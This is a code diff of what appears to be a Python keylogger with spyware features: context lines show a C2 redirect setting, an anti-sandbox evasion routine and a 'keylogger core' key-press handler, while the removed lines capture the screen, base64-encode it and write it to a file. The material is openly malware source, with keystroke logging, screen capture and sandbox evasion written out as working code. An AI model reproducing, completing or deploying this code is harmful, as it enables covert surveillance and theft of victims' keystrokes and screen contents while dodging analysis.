@@ -17,28 +17,6 @@ esp_page = ""  # Optional fallback C2 redirect
 current_word = ""
 buffer = []
 
-
-with mss.mss() as sct:
-    # The monitor or screen part to capture
-    monitor = sct.monitors[1]  # or a region
-
-    # Grab the data
-    sct_img = sct.grab(monitor)
-
-    # Generate the PNG
-    png_binary = mss.tools.to_png(sct_img.rgb, sct_img.size)
-    png_base64 = base64.b64encode(png_binary).decode('utf-8')
- 
-with open("filebyte.txt", "a") as fb:
-    fb.write(f"{png_base64}")
-    
-
-def screenshot():
-    with mss.mss() as sct:
-        filename = sct.shot(output="screenshot.png")
-    print(f"Screenshot saved as {filename}")
-
-# === PHASE 1: Anti-Sandbox / Evasion ===
 def evade_sandbox():
     try:
         if time.time() - psutil.boot_time() < 180:
@@ -78,7 +56,6 @@ def hhhhh(data):
     encode_ASCII = data.encode("ascii")
     encode_base64 = base64.b64encode(encode_ASCII)
     return encode_base64.decode()    
-
 
 # === ORIGINAL KEYLOGGER CORE ===
 def on_press(key):
